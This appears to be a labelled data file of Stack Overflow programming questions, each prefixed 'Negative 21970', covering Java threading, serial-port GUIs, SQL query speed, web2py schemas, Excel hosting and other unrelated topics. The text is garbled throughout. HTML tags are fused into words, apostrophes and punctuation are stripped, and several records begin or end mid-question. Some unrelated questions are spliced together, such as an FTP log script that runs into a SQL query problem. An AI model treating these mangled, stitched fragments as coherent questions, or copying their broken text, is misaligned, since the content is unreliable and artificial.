Negative 21970 pI asked this question a few weeks ago, but Im still having the problem and I have some new hints.  The original question is herep  pa hrefhttpstackoverflow.comquestions1651887javarandomslowdownsonmacoshttpstackoverflow.comquestions1651887javarandomslowdownsonmacosap  pBasically, I have a java application that splits a job into independent pieces and runs them in separate threads.  The threads have no synchronization or shared memory items.  The only resources they do share are data files on the hard disk, with each thread having an open file channel.  p  pMost of the time it runs very fast, but occasionally it will run very slow for no apparent reason.  If I attach a CPU profiler to it, then it will start running quickly again.  If I take a CPU snapshot, it says its spending most of its time in self time in a function that doesnt do anything except check a few unshared unsynchronized booleans.   I dont know how this could be accurate because 1, it makes no sense, and 2, attaching the profiler seems to knock the threads out of whatever mode theyre in and fix the problem.  Also, regardless of whether it runs fast or slow, it always finishes and gives the same output, and it never dips in total cpu usage in this case 1500, implying that the threads arent getting blocked.p  pI have tried different garbage collectors, different sizings the parts of the memory space, writing data output to nonraid drives, and putting all data output in threads separate the main worker threads.  p  pDoes anyone have any idea what kind of problem this could be  Could it be the operating system OS X 10.6.2   I have not been able to duplicate it on a windows machine, but I dont have one with a similar hardware configuration.  p

Negative 21970 pI am explaining my full problem. So I am building one GUI for a device connected to my PC using serial port. I am using javacomm apis and eclipse as my tools. For writing data to serial port I am using thread and for reading I will use a thread or EventListener. So now my question is if I am sending any command to serial port then it should respond with some data and I will print those data on the textArea. But my device responds with data with different patters, like some times in paragraphs and sometimes colon separated and sometimes one line and colon separated. Example belowp  precodetype 1 line 1 line 1 line 1 line 1 line 1 line 1 line parameter 1  value 1 parameter 2  value 2  parameter 3  value 3  type 2 line 1 line 1 line 1 parameter 4 and value 4 line 1 line 1 line 1 line 1 line 2 parameter 5  value 5 line 2 line 2 line 2  type 3 line 1 line 1 line 1 line 1        parameter 6  value 6       parameter 7  value 7 codepre  pNow when I write different commands on serial port they send data in different formats. So If am going to put the data simply in one textArea, there is no problem. but if i want to put the data in lables like belowp  precodeparameter 1in label 1  value 1 label 2 parameter 2in label 3  value 2 label 4 codepre  pSo to display data like above from serial port data how can I do it If I am using string functions for checking for colons and equal signs I have to put so many if else echecks or switch cases when any data arrives from serial port. Everytime any output of any commands reaches to pc from remote device it has to pass through lot of switch cases and ifelse cases...p  pI think it needs a better design.. Do anybody has any idea about any design pattern for designing GUI for serial port Or any type of suggestion is most welcome.....p  pI know the problem description might have so much compicated. If anybody find difficulty in understanding my weird explanation please ask me I will try to explain my problem better.......p

I have also tried to put the command into a shell script that is in the same directory as the PHP script and call the shell script through system. The same happens if the shell script was called doit.sh the error message in the apache log would be sh doit.sh not found.p  pexec has the same behaviour.p  pThe PHP version is 5.2.112 with suhosin extensions.p  pAny ideas what PHP could be doing to my command p
Negative 21970 pI have a pdf that is around 4MB in size. When I open it in Adobe Acrobat version 8 and go to File  Save as the resulting pdf is only 137KB.p  pThis pdf is 67 pages big, each page looking very similar to the other, with only some numbers changed same background, same fonts, almost same text, ... It has been created using a hrefhttpwww.cete.comProductsDynamicPDFForNETMergerindex.cspCete DynamicPDF Mergera from individual pdf files.p  pWhat I think could be a possible cause are the fonts when I check fileproperties and look at the Fonts tab I see that the same font has been included multiple times in it. The new pdf that Acrobat saves only has that font once.p  pIs there a tool preferably a .NET library that would allow me to compress pdfs files like that one similar like Acrobat doesp
Negative 21970 pI am at the point with my Grails app that I want to deploy it up onto Amazon EC2 so I can start showing it to people.  I have a little experience using EC2 manually to put other projects onto the web, but I was hoping to find something which made the deployment cycle a little more manageable.  In steps CloudFoundry.p  pI have read through the web site and watched the tutorials, and on the face of it I like what I see.  However, before I commit to it I wondered whether any of you have experiences to share from the coal face.p  pSpecifically I am going to be deploying a MySQL database along with the app and its not clear what exactly you need to supply SQL scripts and how to best configure my project to deploy through CloudFoundry so that the host name is configured correctly.  I also have a small amount of standard rows which I insert in my BootStrap.groovy and I wonder whether that stuff makes it through deployment.p  pLastly, it is free at the moment, but they are sayin they will introduce charging later.  Are there any open source alternatives that it may be better to investigate in case CloudFoundry ends up being expensivep  pThanksp
Negative 21970 pConsider a hrefhttpdeveloper.apple.comiphonelibrarysamplecodeaurioTouchindex.html relnofollowaurioToucha sample application provided by Apple. I wanted to simulate a lengthy processing of the recorded audio and modified the sample by introducing a delay of 0.1 second in the render callback method codePerformThrucode. This leads to a distorted audio and static noise being played through iPhones speaker or headphones. The noise is heard even when the mute button in the application is on which essentially outputs silence into AudioUnit output bus. p  pCan anybody give a detailed explanation what happens on the low level when the hosts callback function in our sample it is codePerformThrucode does not return in a timely fashionp  pWhy a callback function that performs poorly makes iPhone playback the noise I understand that the code in the callback function must be highly optimized. Still I would like to know if it is possible to prevent the noise from happening.p  pIs it possible to modify aurioTouch sample to make AudioUnit do just the recording and switch the playback off completelyp
Negative 21970 pI am new to both Android and Stack Overflow. I have started developing and Android App and I am wondering two thingsp  p1 Is it possible to parametrize a TextView Lets say I want to render a text message which states something like The user age is 38. Lets suppose that the user age is the result of an algorithm. Using some typical i18n framework I would write in my i18n file something like The user age is 0. Then at run time I would populate parameters accordingly. I havent been able to figure out how to do this or similar approach in Android.p  p2 Lets suppose I have a complex object with many fields. Eg PersonModel which has id, name, age, country, favorite video game, whatever. If I want to render all this information into a single layout in one of my activities the only way I have found is getting all needed TextViews by id and then populate them one by one through code. I was wondering if there is some mapping  binding mechanism in which I can execute something like rendermyPerson, myView and that automatically through reflection each of the model properties get mapped into each of the TextViews. If someone has ever worked with SpringMVC, Im looking for something similar to their mechanism to map domain objects  models to views e.g. springforms.p  pThanks a lot in advanced for your help. Hope this is useful for somebody else  byep

I have subscribed to the CurrentDomain.AssemblyResolve event so as to redirect the framework to my assemblies.p  pThe problem is that the when the framework tries to compile the dynamic assembly for the aspx page I get the followingp  pCompiler Error Message CS0400 The type or namespace name Pages could not be found in the global namespace are you missing an assembly referencep  pSource Error  public class appresourcepagesversion1000cultureneutralpublickeytokennulldefaultaspx  globalPages.Default, System.Web.SessionState.IRequiresSessionState, System.Web.IHttpHandlep  pI noticed that if I load the assembly with Assembly.LoadAssemblyName or Assembly.LoadFromfilename I dont get the above error. If I load it with Assembly.Loadbyte[] so as to not lock it, the exception is thrown but my AssemblyResolve handler, when called is returning the assembly correctly it is called once.p  pSo I am guessing that it is called once when the framework parses the asp markup but not when it tries to create the dynamic assembly for the aspx page.p

Negative 21970 pWe have a script on an FTP endpoint that monitors the FTP logs spewed out by our FTP daemon.

An example of the the query causing the problem is shown below.p  precodeSELECT DISTINCT JobKeysFrom.Key AS KeyFrom,KeysFrom.ID AS IDFrom, KeysFrom.X AS XFrom,KeysFrom.Y AS YFrom,JobKeysTo.Key AS KeyTo, KeysTo.ID AS IDTo,KeysTo.X AS XTo,KeysTo.Y AS YTo, Matrix.TimeInSeconds,Matrix.DistanceInMetres,Matrix.Calculated FROM JobKeys AS JobKeysFrom INNER JOIN JobKeys AS JobKeysTo ON  JobKeysFrom.KeyltgtJobKeysTo.Key AND  JobKeysFrom.JobID531 AND  JobKeysTo.JobID531 INNER JOIN Keys AS KeysFrom ON  JobKeysFrom.KeyKeysFrom.Key AND JobKeysFrom.Status4 INNER JOIN Keys AS KeysTo ON  JobKeysTo.KeyKeysTo.Key AND JobKeysTo.Status4 INNER JOIN Matrix AS Matrix ON  Matrix.IDFromKeysFrom.ID AND Matrix.IDToKeysTo.ID ORDER BY JobKeysFrom.Key,JobKeysTo.Key codepre  pI have tried the following p  ol lichecked the indexes and all seem correct and they are active and are being used according to the query li lithe design advisor comes back with no suggestionsli liI have tried defragging the indexes and datali lirebuilt the database from scratch by exporting the data and reimporting it in a new database.li liran the profiler on it and found that when it goes wrong it seems to do many millions up to 100 million of reads rather than a few hundred thousand.li liran the database on a different serverli ol  pDuring the time it is running the query, I can run exactly the same query in the management studio window and it will be back to running in 10 seconds. The problem does not seem to be lock, deadlock, CPU, disk or memory related as it has done it when the machine running the database was only running this one query. The server has 4 processors and 16 gb of memory to run it in. I have also tried upgrading the disks to much faster ones and this had no effect.p  pIt seems to me that it is almost as though the database receives the query, starts to process it and then goes to sleep for 40 minutes or runs the query without using the indexes. p  pWhen it takes a long time it will eventually finish and send the query results normally about 70100000 records back to the calling application.p  pAny help or suggestions would be gratefully received, many thanksp

Negative 21970 pI have a native Visual C NT service. When the service is started its thread calls codeCoInitializecode which attaches the thread to an STA  the service thread uses MSXML through COM interfaces.p  pWhen the service receives codeSERVICECONTROLSTOPcode it posts a message in the message queue, then later that message is retrieved and the codeOnStopcode handler is invoked. The handler cleans up stuff and calls codeCoUnitializecode. Most of the time it works allright, but once in a while the latter call hangs. I cant reproduce this behavior stably.p  pI googled for a while and found the following likely explanationsp  ol lifailing to release all COM objects ownedli lia hrefhttpsupport.microsoft.comkb293278 relnofollowrepeatedly calling codeCoInitializeExcodecodeCoUnitializecode for attaching to MTAali lia hrefhttpsupport.microsoft.comdefault.aspxscidkbenus136885 relnofollowfailing to dispatch messaged in STA threadsali ol  pThe first one is unlikely  the code using MSXML is well tested and analyzed and it uses smart pointers to control objects lifetime, so leaking objects is really unlikely.p  pThe second one doesnt look like the likely reason. I attach to STA and dont call those functions repeatedly.p  pThe third one looks more or less likely. While the thread is processing the message it doesnt run the message loop anymore  it is inside the loop already. I suppose this might be the reason.p  pIs the latter a likely reason for this problem What other reasons should I consider How do I resolve this problem easilyp

Negative 21970 pIm starting to build a realtime raytracer for iOS.  Im new to this raytracing thing, all Ive done so far is write a rudimentary one in ObjC.  It seems to me that a Cbased raytracer is going to be faster than one written in ObjC, but the ObjC one will be far simpler, as object hierarchies come in very handy.  Speed is very important, though, as I want it to be realtime, say 30 fps.  p  pWhats your opinion on whether the speed up of C be worth the extra complexity  I can forsee the C code taking much longer and causing me headaches with lots of bugs although Im not new to C, but going for more speed is seductive initially.p  pAre there any examples out there of raytracers written in C My google search for such things is contaminated with lots of results for C and C.p

Negative 21970 pI need to host Excel spreadsheet in our WinForms app. It looks loading the excel file into WebBrowser control is the way to go. There are several articles on the Internet about this. However, they mostly use Excel 2003 I guess. Excel 2007 presents some new problemsp  ol lipBy default, the Excel spreadsheet is opened up in a new window, instead of embedded in my WebBrowser control. Base on Microsoft, this is by design, but it also suggests a fix by changing the registry settings. This is not great, but I can probably live with that.pli lipWith that registry change, I was able to embed the Excel spreadsheet in my WebBrowser control. However, the Excel Workbook is still open in background  which I cant even close, but is closed automatically when my WinForm app is closed. It is interesting when you watch how the spreadsheet gets loaded its loaded into the Excel workbook in background first and then transfered into my WebBrowser control. How can I get rid or hide of this background window  EDIT Actually, the Excel window is not closed, but put into background. However, with help from a hrefhttpwww.codeproject.comKBofficeEmbeddingExcel.aspx relnofollowthis articlea at CodeProject, it can be closed. In that article, the Excel window is closed when WinApp is closed. But the same function can be used to close that window on WebBrowsers DocumentCompleted event. Its not perfect becuase you still see a screen flash, but its okay. I wish there is a better way to do it. To avoid screen flashes, I tried to just minimize the Excel window. However, when I try to set the WindowState to Minimized, it throws a COM exception. Any clue It would be a better workaround if I could hide this disabled window from beginning.pli lipWhen you open a spreadsheet first time, a messgebox pops up asking you for options to Open, Save, and Cancel. There is a checkbox to disable it. But I dont want this messagebox ever show up. What is the registry setting for thispli lipIn my spreadsheet, there is an addin component which should be loaded dynamically. However, loading it to WebBrowser doesnt work it cant find it. If I make the addin active, it loads without problem. Is there anything on WebBrowser to be changed to make it workpli ol  pAre there better alternatives to host Excel spreadsheet in WinForms appp

Negative 21970 pI have been going nuts trying to figure out why my PHP pages load twice. A lot of people have experienced it, and although some people find out  a solution, many havnt. I have a clue that may help more people unravel this.p  pI only noticed it when MySQL insert statements inserted 2 entries. When I first discovered it, I thought it was MySQL, but the inserts have different quote numbers which were generated by PHP. So it emmustem have been PHP and not MySQL causing this doubling effect. Sometimes it was more than doubled.p  pI researched heavily, and most people had these solutionsp  ul liturn on output buffering, and start it, then flush it before and after codeli liyou have a missing img src somewhere. Check there are no 404s on the page, be it styles, js, favicon, css images, or img tags.li liyour code has a loop, check your codingli lias a workaround, use a session force the insert into only firing once. So start a session, do the insert, then delete the session. Restart the session on the following page so it can be inserted again later if needed.li ul  pBut none of these helped. p  pDespite that PHP would load twice, a JavaScript alert would load once. So I decided that the only way around this issue would be a jQuery post, with a bunch of variables shooting through. Not even this worked  the PHP page it posted to had emnoem HTML, and a small number of includes that needed to be present for the database connection.p  pSo I thought, as a nonelegant but last resort solution, that I would have to make it only insert if it wasnt within 5 seconds of the last entry and same IP codeSERVER[REMOTEADDR]codep  pWhen doing this I noticed that it recorded two different IP addresses So it inserted twice, same timedate stamp, but different IP address. One was mine, one wasnt. There was a remote IP address somehow in there.p  pI thought my security software must be going a bit too far telling other servers information about my machine, so I ditched my Comodo software, and installed Avast. Removing comodo didnt fix it. I did a scan using Avast, nothing showed upp  pI looked through my software Widows 7, 32 bit, there isnt much there. Nothing dodgy, no games, and I havnt been going to smutty websites. p  pSo U looked to my router dlink dir 615 to block the outgoing IP  cant, or at least, I dont know how to.

Negative 21970 pWaiting time is defined as how long each process has to wait before it gets its time slice. In scheduling algorithms such as Shorted Job First and First Come First Serve, we can find that waiting time easily when we just queue up the jobs and see how long each one had to wait before it got serviced.p  pWhen it comes to Round Robin or any other preemptive algorithms, we find that long running jobs spend a little time in CPU, when they are preempted and then wait for sometime for its turn to execute and at some point in its turn, it executes till completion. I wanted to findout the best way to understand waiting time of the jobs in such a scheduling algorithm.p  pI found a a hrefhttpsankofa.loc.educhuwebCoursesCosi410Ch2RdRobin.htm relnofollowformulaa which gives waiting time asp  precodeWaiting Time  Final Start Time  Previous Time in CPU  Arrival Time codepre  pBut I fail to understand the reasoning for this formula.

Negative 21970 pI remember stumbling upon a video clip introducing a new programming language and a paradigm. The language was 2D and visual in nature, and therefore tightly coupled with its IDE and interpreter in the video.p  pIt started out like a truth table but got more complicated. Conditionals were represented in the X axis and the flow in the Y axis of the program.p  pFor example, to build an absolute value function, one defined inputs and outputs, lets call them integer codeIcode and integer codeOcode. Clicking on codeIcode allowed one to define a subcase, say codeI lt constcode. One then entered code0code as the constant and the codeIcode column split into two codeI lt 0code and codeI gt 0code. One connected both to codeOcode, one of them through a codenegcode function and got the absolute value function.p  pThe point was that missing cases were immediately and visually identifiable defining two cases codex lt 0code and codex gt 0code immediately split the codexcode column into three and if you forgot to connect the codex  0code case to the output, it would be obvious.p  pThis is about as brief as I can be while still supplying enough information for people to identify andor get interested about the language, so Ill cut it here. It may look like it only solves some specific problems to do with conditionals and logic, but I remember the language being strong enough to be a paradigm on its own.p  pThe video also made some good points about how modern programming wasnt that much different from what it was some 50 years ago, i.e. typing text, which is fundamentally 1D, on a teletype.p  pQuestion Whats the name of the languageparadigmIDEinterpreterp  pIm mainly looking [for the name] to find and watch the video again, so I can discuss it with my current colleagues. If you have more to say about it, we can turn this question into a community wiki and start discussing. p

But when I run the query in C using SqlClient its incredibly slow about 510 seconds. I benchmarked every little part of my program and found out that the connect to the sqlserver is made in about 10 milliseconds, so the link between the two machines cannot be the problem.p  pI tried almost everything until I found out, that the query in C using SqlClient returns the results almost as fast as running the query directly on the sqlserver, if I remove the ORDER BY Num ASC from the query.p  pSo my question is What the hell is SqlClient in C doing with ORDER BY to multiply the used time by thousands of millions compared to the sqlserver itself p

Negative 21970 pI have a repeater control in master page that fetches categories from Sql. Since these categories are common in some of the pages I decided to put the code in the master page. However, the user can create more categories from a content page and here the problem emerges. Since in the page life cycle events in the content page are executed after master page controls are created, when a user creates a category refreshing the page becomes compulsory in order to see the category created. In other words, when the user creates a category the event occurs after the repeater control is executed and therefore the list of categories is actually not updated and the user has to refresh the page in order to see the category. As I dont want to refresh the page automatically, can anyone suggest me another way to handle this problemp  pEdit example of the code is as follows.

Negative 21970 pIn order to get around navigation issues using UISplitViewController, Ive written a controller to replace it. One difference is the navigation bar at the top takes the whole screen I wouldnt mind if it looked like split view, but this is what you get by default. It works ok except when you search. In the master view on the left is a table view with a UISearchDisplayController. When you click in the search bar, there are a few issues. One, the WHOLE full screen view moves up 44 pixels covering the nav bar this I can probably live with. Two, the search table frame takes up the whole width of the screen. I fixed this by changing the search table frame inp  precodevoidsearchDisplayControllerUISearchDisplayController controller didShowSearchResultsTableViewUITableView srchTableView codepre  pAnother thing that happens is the two toolbars I have at the bottom of the screen one for master, one for detail move up 44 pixels.

Negative 21970 pThe issue is brp  pI have vectortopoimage tiled maps for some places in north america which were published as ArcGIS Server REST service. These maps A are based in EPSG26912 projection. Now I wanna use these as basemap for my openlayer web app besides, I also want to consume other base map sources B, e.g., OpenStreetmap, Google Maps, ESRI, etc. Since most of these maps are in EPSG900913 which is sphericalMercator projection to my knowledge, if I just add these base map layers into openlayer map component, the group A and group B wont overlay correctly, which means they are displayed as seperate maps. I know this is something related to projection, and might need some code with proj4js, however, as a newbie, I dont really know how to start with. p  pBasically, I want to put OSMGoogle maps as the base map for the whole world in tier 1, then put EPSG26912 base maps for some places in north america in tier 2, and put other WMS or WFS in the top tier.p  pdo I need to transform EPSG26912 to EPSG900913 or opposite I guess I should use EPSG900913 as the base projection.p  pAppreciate any repliesp

If not, how can that be controlled to match the data entry flow instead of bouncing around in the sequential order the application happens to create objects and their respective validation rules.pli lipIs there a way to have ALL failed controls triggered for the default behavior of putting a red border box around the failed control instead of only one at a time.pli ol  pThanksp

Negative 21970 pDoes anybody has experience in in using XSLT in asp.net MVC 3p  pThe intention here is to be able to develop pages whose styling and layout can be changed at runtime based on some conditions. for example, user profile.p  pOne solution is that We can use separate layout pages and set that at runtime by setting the dynamic property Viewbag. But this approach would require a recompile if we want to add new layout to the page. I was thinking that may be we could load an XSL dynamically in the controller at runtime and bind it to the model object at runtime. The HTML content can then be rendered in a predefined section in the page.p  pA code snippet would be a great help.p

However, in this examplep  precodeclass SuperClass      private int n3     int getN          return n        class SubClass extends SuperClass      public static void mainString[] args          SubClass e  new SubClass         System.out.printlnn   e.getN       codepre  pWhen I run codemaincode I get the output as coden3code.

Negative 21970 pI am using 10g, and am trying to do some simple calculation and then save the result in a column. The actual tables have many more columns, but here are the what I am using in my queryp  precodeCREATE TABLE VACCINELOT    VACCINELOTID   NUMBER10,0 NOT NULL ENABLE,   DOSE             NUMBER6,3,   QUANTITYONHAND NUMBER12,2 NOT NULL ENABLE  CREATE TABLE IMMUNIZATION    VACCINELOTID NUMBER10,0,   DOSEMAGNITUDE NUMBER4,2  CREATE TABLE VACCINELOTTRANSACTION    VACCINELOTID NUMBER10,0 NOT NULL ENABLE,   QUANTITY       NUMBER12,2 NOT NULL ENABLE  INSERT INTO vaccinelot VALUES 100, 0.2, 120 INSERT INTO immunization VALUES 100, 0.2 INSERT INTO immunization VALUES 100, 0.3 INSERT INTO vaccinelottransaction VALUES 100, 150 codepre  pImmunization shots are taken from a vaccine lot. Dosemagnitude is how much a particular immunization shot uses from a lot. The Dose column in vaccinelot tells how much to use for a standard immunization shot. So a standard shot may be 0.1cc. But one immunization shot may actually use 0.2cc or even 0.05cc. The Quantity column in vaccinelottransaction records originally how many standard immunization shots a vaccine lot contains. p  pWhat I am trying to do here is to calculate the correct Quantityonhand for vaccine lots that is, how many standard immunization shots are still left for vaccine lots.p  pHere is an example using the data we just inserted. We have a vaccine lot lot ID is 100, and it starts off with 150 standard shots that is, it contains 150 0.2cc shots. There are two immunization shots from this lot already, one 0.2cc, the other 0.3cc. And the current quantity of 120 is obviously wrong, and we need to recalculate and update it.p  pHere is my queryp  precodeUPDATE vaccinelot V SET quantityonhand        SELECT T.quantity  V.dose FROM vaccinelottransaction T WHERE V.vaccinelotid  T.vaccinelotid     SELECT SUMI.dosemagnitude FROM immunization I WHERE I.vaccinelotid  V.vaccinelotid    dose  codepre  pAnd sure enough, Oracle starts to complain about missing right parenthesis. Looks like it thinks there is something syntactically wrong.p  pCan anyone help take a look at this query and see whats wrong with it Thanks brp  pThis is what I get when I run it through SQLPLUS p  precode    SQLgt run   1  UPDATE vaccinelot V SET quantityonhand    2     3      4     SELECT T.quantity  V.dose FROM vaccinelottransaction T   5        WHERE V.vaccinelotid  T.vaccinelotid    6     SELECT SUMI.dosemagnitude FROM immunization I   7        WHERE I.vaccinelotid  V.vaccinelotid   8     dose   9        WHERE V.vaccinelotid  T.vaccinelotid                                                    ERROR at line 5 ORA00907 missing right parenthesis codepre  pbr By the way, I am using version 10.2.0.1.0 of SQLPlus.

Negative 21970 pIm having problems modifying SQL table schema in web2py. p  ol liIf I change the field type of an existing field in codedb.definetablecode, the SQL columns new type seems to register in web2py, but doesnt actually change anything in the database, which leads to errors.li liIf I drop a field from codedb.definetablecode, it doesnt go away in SQL.li ol  hr  h2Example 1 Changing field typesh2  pI start out with a table like sop  precodedb.definetabledummy,     Fieldname, string,     Fieldcreated, date      codepre  pIf I inspect the tables create statement in SQLite manager, it looks like thisp  precodeCREATE TABLE style     id INTEGER PRIMARY KEY AUTOINCREMENT,     name CHAR512,     created DATE codepre  pIve plugged in a few records, though left codecreatedcode blank. Then I realize that I want codecreatedcode to be a datetime, and that I want to add another field, codemodifiedcode that is also a datetime. So I change db.py to the followingp  precodedb.definetabledummy,     Fieldname, string,     Fieldcreated, datetime,     Fieldmodified, datetime      codepre  pI get no errors initially. However, if I glance at the create statement, I see the followingp  precodeCREATE TABLE style     id INTEGER PRIMARY KEY AUTOINCREMENT,     name CHAR512,     created DATE,     modified TIMESTAMP codepre  pSo according to SQLiteManager, the new codemodifiedcode column is the right type, but the old codecreatedcode columns type has not changed. p  pIf I then go into web2pys db admin and edit a row, it will pretend that both codecreatedcode and codemodifiedcode are datetime when I edit those values it gives me a datetime popup editor. Editing the codemodifiedcode column works fine, but if I edit codecreatedcode, then the db admin screen is no longer able to perform basic select queries, and instead gives me the error p  blockquote   pstrongInvalid Querystrong invalid literal for int with base 10 19 113339p blockquote  hr  h2Example 2 Dropping fieldsh2  pFinally, lets say I want to drop the codecreatedcode column and start over, so I exclude it in my codep  precodedb.definetabledummy,     Fieldname, string,     Fieldmodified, datetime      codepre  pBut nothing changes I still see the codecreatedcode column in SQLite manager, and the above errors persist.p  hr  pThe last thing I want to do is edit the table directly in SQLite manager I tried this once and it turned into a nightmare as web2py was completely out of sync with the database.p  pHow can I force web2py to emredefineem tables, by deleting old columns and updating types of existing columns if necessaryp

Negative 21970 pemstrongtldr at bottom.emstrongp  pOk, so once again an interesting problem and Im looking for a fun and interesting solution.p  pMy current project involves being very modular, meaning the program functionality will be easily changed based on different modules and the program would adapt. p  pSo I started out with the typical route, which is using DLL plugins. Now this is just way to normal, I want to think outside the box a bit. p  pThe modules included in my program are long running campaigns that may take weeks to finish, and there will be many running at a time. So stability is a big issue, so I thought about what Google Chrome does. Processes, not DLLs or threads.p  pSo I have a framework going and I need a way to get some information about each module which are now EXEs. Now for my DLL framework I was exporting a Register function that would fill in some information. p  pSo I thought to myself, hey EXEs can export functions, lets see if that actually works...It doesnt. I did some research into how Windows handles theses things and I dont feel like hacking the PE headers on the fly but its the out of the box kind of thinking Im going for.p  pIm planning on using named pipes and CLI parameters to transfer data between the main program and the module exes. I could use that in a register fashion, but I want to here other peoples thoughts. p  pemstrongtldr Im using EXEs instead of DLLs for plugins. Looking for a way to easily export one time information like a exported Register function would on a DLL. Thoughtsemstrongp
Negative 21970 pI need some advice on the best approach for a single sign on solution. p  pBasically I am dealing with 2 sites already in production. Site A is .net paiedr with SQL, while site B is php paired with MySQL.p  pI figure a quick and dirty way to create a single login, would be to import existing users from site A into site B and vice versa. Then I would add some additional code to the registration script so if a new member registers in site A, the new account will be inserted into both database going forward. The same for site B.p  pI would appreciate alternate suggestions.. Thanksp

Negative 21970 pI am calculating satellite coverage footprints on the surface of an ellipsoid and my function returns a list of Lat  Lons that looks like below. It is a python list of dictionaries. Now if I scatter plot this in Matlab or Matplotlib I get a nice 3D footprint of disconnected points.. However, I want to be able to use the plot not scatter command to create a smooth 3D circle to represent the footprint. In order to do this I need to sort them somehow. Ive tried Haversine greatest circle distance to find the nearest neighbor for each point but this still gives me the occasional disconnected line when I have a larger set of values GEO sats. Ive also attempted to split the values into N and S latitudes when the footprint straddles the equator, and then sort by longitude. Im probably missing something  Does anyone have a betterfaster idea to sort a list like this so that if I connect all sequential points in the list I would get a complete, ordered, circlep  precodelatLons  [lat 33.783781327, lon 137.47747747700001, lat 33.783781326899998, lon 139.63963964000001, lat 33.603601166200001, lon 136.03603603600001, lat 33.423421005500003, lon 134.59459459499999, lat 32.882880523399997, lon 132.43243243200001, lat 32.522520202199999, lon 131.71171171200001, lat 32.342340041600004, lon 145.40540540500001, lat 31.261259078399998, lon 147.56756756799999, lat 31.081078917799999, lon 128.828828829, lat 29.459457473099999, lon 126.666666667, lat 28.558556670200002, lon 125.94594594599999, lat 27.657655866700001, lon 125.225225225, lat 26.936935223300001, lon 151.89189189199999, lat 26.7567550624, lon 124.504504504, lat 25.6756740961, lon 152.61261261300001, lat 25.3153137736, lon 123.78378378399999, lat 23.873872481599999, lon 153.33333333300001, lat 23.333331995999998, lon 123.063063063, lat 19.3693684138, lon 154.05405405400001, lat 15.765765115600001, lon 123.063063063, lat 15.2252246167, lon 153.33333333300001, lat 13.243242777300001, lon 152.61261261300001, lat 12.162161767000001, lon 124.504504505, lat 11.801801428999999, lon 151.89189189199999, lat 10.9009005815, lon 125.225225225, lat 8.1981980155999992, lon 149.00900900900001, lat 6.9369368056800003, lon 147.56756756799999, lat 6.5765764584799999, lon 129.54954954999999, lat 6.5765764584799999, lon 146.84684684699999, lat 5.6756755875199998, lon 130.99099099099999, lat 4.7747747122700002, lon 143.24324324299999, lat 4.23423418502, lon 141.08108108100001, lat 3.8738738326600002, lon 138.198198198] codepre

Negative 21970 pI have a RESTful api using Jersey right now, and am converting it to be OData standard compliant. There are a few things I have not converted yet, but will get there, and is not important at this moment. One of the things I need to convert that is important is the key path params. Odata has the standard of making the key wrapped in parenthesis. So in this example myapi.comproduct1  is the OData call to get a product whose id is 1. Currently that is possible in my system with this myapi.comproduct1p  pWhen I add the parenthesis to the path parameter I get a 404 error. My class level path is Pathproduct and my method level path is Pathid, and use to be Pathid. Ive tried adding the parenthesis as part of the variable planning to strip them off in the method, and Ive tried formatting the id with some regex Pathid  regex stuff, and neither works. p  pIf I make my method path parameter like this Pathid  so the call is myapi.comproduct1, it works fine. The parenthesis is not the issue obviously. It seems the Jersey splits the uri into chunks using the forward slashes for the routing, and sense there is no forward slash between the id an root resource name, then nothing is found. It makes sense. p  pIs there a way to change Jerseys method of matching uri strings with some regex or something Has anyone used Jersey with Odata I would rather not use odata4j just for the resolution to this issue, it seems like there should be a way to get this to work. p  pstrongWhat I didstrong Based on Pavel Buceks answer I did implement a ContainrRequestFilter independently to the filter I use for security.

Negative 21970 pWhen I am rebooting my android device kindle fire or kill an application, it seems like the browser or WebView session cookies are not deleted. This seems to be quite different from the behavior of browsers on Windows or MacOS where session cookies are gone if you kill the browser application. Only persistent cookies should be persisted after browser process restart. To clarify, the meaning of session cookies here is a cookie set by the server with no expiration date, using http header in the response, such as SetCookie mycookieifmr0846qcsdpeqqkgvuqmc5u7 path Since no expiration date is specified, browsers typically dont persist those, keep them alive until the process is killed, based on my understanding. Typically session ids are set using this type of cookie.p  pI am convinced that those are not deleted on device reboot, or app restart because if I log in to my website, establishing a session using non persistentsession cookie for the session id, named PHPSESSID in that case, then reboot the device and open the browser or WebView to the same url, I am still logged in, which means to me that the browser still sent the same PHPSESSID cookie that was set by the server before device reboot.p  pCould anyone explainconfirm this behavior for android WebViews or browser How do they manage session and persistent cookies exactlyp  pthanks.p
Negative 21970 pIm trying to combine a border on an UIView with a line drawn in drawRect. I use for both the same width. But the problem is that sometimes the resulting width of the lines drawn is the same for both and sometimes not  this even changes with device orientation But even without changing the device orientation its in general still not the same width.p  pThe border is drawn withp  precodeview.layer.borderColor  [UIColor blackColor].CGColor view.layer.borderWidth  1.0f codepre  pAbove that view is another view, which is a subclass of UIView. Both views have the same width and this second view covers the above views top.

Thats why Im doing this. The first view has the rounded corners and the second view above it matches it in width but covers the top part, so the rounded cornes on the top are not visible.p  pScreenshot in portrait img srchttpi.stack.imgur.comG8TSb.png altenter image description herep  pScreenshot in landscape img srchttpi.stack.imgur.comdroCZ.png altenter image description herep  pThe yellow view is above the white view.

Negative 21970 pWe are using Reel JS for a 360 viewer we developed.  We made it so that we have multiple thumbnails on the page and the user can select a thumbnail and a new Reel JS 360 viewer populates the page. p  pWe are having issues on the iPad though.  When we try to switch between image sequences the iPad tends to choke or stall halfway through loading the images to the Reel JS 360 viewer. We are using a first generation iPad. We are using hidden input fields to call the image sequence and loading the images into a placeholder. So all the images are not loaded to the page on page load. p  pOn an Motorola Xoom tablet running Android, the image sequences load completely and fairly quickly.  p  pCan anyone enlighten us on why on the iPad the image loader chokes  is there something wrong with our JS  The code works fine on Android Tablets and our desktops, but not on the iPad.p  pOur test page is here a hrefhttpwww.dmns.orgtestjquery360index4.html relnofollowhttpwww.dmns.orgtestjquery360index4.htmlap  pI have not posted any code because I dont exactly know if it is a code issue or just a limitation of the iPad, so I would like to see if anyone else could test it on an iPad and help us with any insight or thoughts.

Negative 21970 pIm currently working on a BizTalk implementation in which I need to split an incoming message. So far the only examples Ive been able to find make use of an envelope schema that would create one message per child node of the incoming message.p  pHowever in the message Im getting, that wont simply suffice.

